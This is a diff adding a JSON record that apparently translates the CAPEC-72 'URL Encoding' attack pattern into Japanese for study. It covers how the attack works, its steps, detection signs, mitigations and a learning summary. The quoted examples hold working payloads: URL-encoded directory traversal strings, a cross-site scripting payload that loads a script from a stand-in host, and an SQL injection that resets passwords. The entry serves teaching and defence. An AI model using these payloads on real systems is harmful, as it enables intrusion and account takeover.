@@ -1,0 +1,91 @@
+{
+ "id": "72",
+ "source_sha": "8aff2a03599a5b63",
+ "status": "done",
+ "seg": {
+  "name": "URL符号化",
+  "description/0": "この攻撃は、URLの符号化を標的とする。攻撃者は、URLを符号化する複数の方法を利用し、URLの解釈を悪用できる。",
+  "extended_description/0": "URLには、解釈されるために特別な構文の扱いを必要とする特殊文字が含まれることがある。特殊文字は、パーセント記号に続けて、元の文字のオクテットコードを表す2桁（%16進コード）で表される。",
+  "extended_description/1": "たとえば、US-ASCIIのスペース文字は%20で表される。これはしばしば「エスケープ」や「パーセントエンコーディング」と呼ばれる。サーバーは要求からURLを復号するため、受け取ったURLの要求を検証・フィルタすることで、一部のURLパスへのアクセスを制限していることがある。攻撃者は、サーバーで解釈されると禁止されたURLと同じ意味になる、特殊文字の並びを持つURLを作ろうとする。",
+  "extended_description/2": "URLには、UTF-8符号化やUnicode符号化など別の形式の符号化も含まれうるため、この攻撃を防ぐのは難しいことがある。攻撃者はまた、GETリクエストを通じてサーバーに送られるデータを符号化することで、URL文字列の要求の意味を覆せる。たとえば、攻撃者は、URL文字列を通じて送られるSQLリクエストで使われるパラメータの意味を覆せることがある（例の節を参照）。",
+  "execution_flow/0/description/0": "［パラメータを持つURLがないか、ウェブアプリケーションを調査する］ブラウザ、自動化ツール、またはアプリケーションの検査によって、攻撃者はパラメータを含むすべてのURLを記録する。",
+  "execution_flow/0/techniques/0/0": "スパイダリングツールを使ってパラメータを含むURLを記録する。",
+  "execution_flow/1/description/0": "［URLを探り、弱点を見つける］攻撃者は、「探索」の段階で集めたURLを標的の一覧として使い、特殊文字のさまざまな符号化でパラメータを試し、ウェブアプリケーションがそれをどう扱うかを調べる。",
+  "execution_flow/1/techniques/0/0": "通常ならフィルタされるセミコロン、バックスラッシュ、疑問符などの特殊文字について、URL符号化を使う。",
+  "execution_flow/1/techniques/1/0": "URL符号化と、3連ドットやスラッシュのエスケープなど、ほかの符号化の手法を組み合わせる。",
+  "execution_flow/2/description/0": "［URLパラメータへの特殊文字の注入］「試行」の段階で得た情報を使い、攻撃者は、URL符号化を使ってURLに特殊文字を注入する。これは、パストラバーサル、クロスサイトスクリプティング、SQLインジェクションなどにつながりうる。",
+  "prerequisites/0/0": "アプリケーションが、URLの入力を受け付け、復号すること。",
+  "prerequisites/1/0": "アプリケーションが、URLに対するフィルタや正規化を不十分にしか行っていないこと。",
+  "skills/0/text/0": "攻撃者は、URLで特殊文字を試し、URLの検証を回避できる。",
+  "skills/1/text/0": "攻撃者は、入力のフィルタの仕組みを打ち破るスクリプトを書くことがある。",
+  "indicators/0/0": "最初の復号の過程で、無効な文字や拒否リストにある文字が残っていれば、その要求が悪意あるものである兆候かもしれない。",
+  "indicators/1/0": "IDS（またはプロキシ）による通信のフィルタリングは、不審なURLを含む要求を検知できる。",
+  "consequences/1/note/0": "サービス妨害",
+  "consequences/2/note/0": "任意のコードの実行",
+  "mitigations/0/0": "すべての入力が悪意あるものだと想定する。要件仕様にもとづく許可リストを作り、合致しない入力は受け入れない。",
+  "mitigations/1/0": "復号の過程を、悪意ある入力に対してテストする。",
+  "mitigations/2/0": "セキュリティの検査は、データが復号・検証されたあとに行う。復号を繰り返さない。",
+  "mitigations/3/0": "URLを安全に復号するため、RFCを参照する。",
+  "mitigations/4/0": "安全なURLのパターンに一致させるため、正規表現を使える。ただし制限しすぎると有効な要求まで捨ててしまう。",
+  "mitigations/5/0": "IPアドレスの符号化のような、別のデータ符号化・難読化の手法という脅威を意識する（関連する指針の節を参照）。",
+  "mitigations/6/0": "サーバーへのHTTPリクエストの有効なURLをスキャンするツールがある。",
+  "examples/0/0": "IceCast MP3サーバーでのURL符号化の例。詳細は下記の原文を参照。",
+  "examples/0/3": "または次のように使う。",
+  "examples/0/5": "制御文字の「..」は、攻撃者がドキュメントルート（公開フォルダの最上位）の外へ出るのに使われうる。",
+  "examples/0/6": "参考：CVE-2001-0784",
+  "examples/1/0": "クロスサイトスクリプティング。",
+  "examples/1/1": "URL符号化された攻撃の例（原文）。",
+  "examples/1/2": "実行されるHTMLの例（原文）。",
+  "examples/1/3": "[REF-495]",
+  "examples/2/0": "SQLインジェクションの例。",
+  "examples/2/1": "例のファイル「login.asp」での元のデータベース問い合わせ（原文）。",
+  "examples/2/2": "URL符号化された攻撃の例（原文）。",
+  "examples/2/3": "実行されるデータベース問い合わせ（原文）。",
+  "examples/2/4": "出典：Gunter Ollmann氏「URL encoded attacks」。",
+  "examples/3/0": "組み合わせた符号化を使ったCesarFTP。",
+  "examples/3/1": "CAPEC-64の説明で述べたCesarFTPの例と同じものを参照。",
+  "examples/3/2": "攻撃者は、次のような文字列を含むURLを与えられた。",
+  "examples/3/4": "これは、エスケープ文字、URL符号化、3連ドットという複数の手口を組み合わせている点で、興味深い悪用例である。",
+  "examples/3/5": "参考：CVE-2001-1335"
+ },
+ "quotes": {
+  "examples/0/0": "URL Encodings in IceCast MP3 Server.",
+  "examples/0/1": "The following type of encoded string has been known traverse directories against the IceCast MP3 server9:",
+  "examples/0/2": "http://[targethost]:8000/somefile/%2E%2E/target.mp3",
+  "examples/0/4": "\"/%25%25/\" instead of \"/../\".",
+  "examples/1/1": "URL-Encoded attack:http://target/getdata.php?data=%3cscript%20src=%22http%3a%2f%2fwww.badplace.com%2fnasty.js%22%3e%3c%2fscript%3e",
+  "examples/1/2": "HTML execution:<script src=\"http://www.badplace.com/nasty.js\"></script>",
+  "examples/2/1": "Original database query in the example file - \"login.asp\":SQLQuery = \"SELECT preferences FROM logintable WHERE userid='\" & Request.QueryString(\"userid\") & \"' AND password='\" & Request.QueryString(\"password\") & \"';\"",
+  "examples/2/2": "URL-encoded attack:http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00",
+  "examples/2/3": "Executed database query:SELECT preferences FROM logintable WHERE userid='bob'; update logintable set password='0wn3d';",
+  "examples/2/4": "From \"URL encoded attacks\", by Gunter Ollmann - http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html",
+  "examples/3/3": "/...%5C/"
+ },
+ "review": [],
+ "redacted": [],
+ "supplement": {
+  "summary": "URLの中の特殊文字を、パーセント記号を使った別の書き方（符号化）に置き換えることで、入力フィルタをすり抜ける攻撃。SQLインジェクションやクロスサイトスクリプティングなど、別の攻撃を仕込む手段としても使われる。",
+  "terms": [
+   {
+    "term": "パーセントエンコーディング",
+    "en": "percent-encoding",
+    "explain": "URLで使えない文字を「%」と16進数の2桁で表す符号化の方法。"
+   }
+  ],
+  "facts": [
+   {
+    "text": "アプリケーションがURLの入力を受け付け、復号することが前提だと原典に書かれている。",
+    "source": "CAPEC-72 前提条件"
+   },
+   {
+    "text": "対策として、許可リスト方式の検証と、復号後の再検証（復号を繰り返さないこと）が挙げられている。",
+    "source": "CAPEC-72 対策"
+   }
+  ],
+  "analogy": "CAPEC-64と同様、荷物の検査を1回で済ませず、梱包をすべて解いたあとの中身に対して行う必要がある、という状況に近い。",
+  "learn": [
+   "URLの符号化が、別の攻撃（SQLインジェクションなど）を運ぶ手段にもなりうること",
+   "復号を1回だけ行い、そのあとに検証することが、どの前提条件を崩す対策なのか"
+  ]
+ }
+}
